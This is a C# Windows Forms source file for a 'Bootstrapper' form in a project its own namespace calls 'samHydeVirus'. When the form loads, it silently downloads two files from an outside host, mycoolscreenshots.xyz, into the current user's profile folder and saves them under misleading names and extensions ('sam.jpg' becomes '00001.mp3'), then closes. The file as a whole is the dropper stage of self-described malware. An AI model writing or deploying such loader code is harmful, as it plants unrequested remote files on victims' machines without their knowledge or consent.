using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace samHydeVirus
{
    public partial class Bootstrapper : Form
    {
        public Bootstrapper()
        {
            InitializeComponent();
        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void Bootstrapper_Load(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            wc.DownloadFileAsync(new System.Uri("http://mycoolscreenshots.xyz/sam.jpg"), @"C:\Users\"+ Environment.UserName+@"\00001.mp3");
            
            wc.DownloadProgressChanged += Wc_DownloadProgressChanged;
            wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
        }

        private void Wc_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            WebClient ac = new WebClient();
            ac.DownloadFileAsync(new System.Uri("http://mycoolscreenshots.xyz/sam.ico"), @"C:\Users\" + Environment.UserName + @"\00002.ico");

            ac.DownloadProgressChanged += Ac_DownloadProgressChanged;
            ac.DownloadFileCompleted += Ac_DownloadFileCompleted;
        }

        private void Ac_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            this.Close();
        }

        private void Ac_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
        }

        private void Wc_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            progressBar1.Value = e.ProgressPercentage;
        }
    }
}
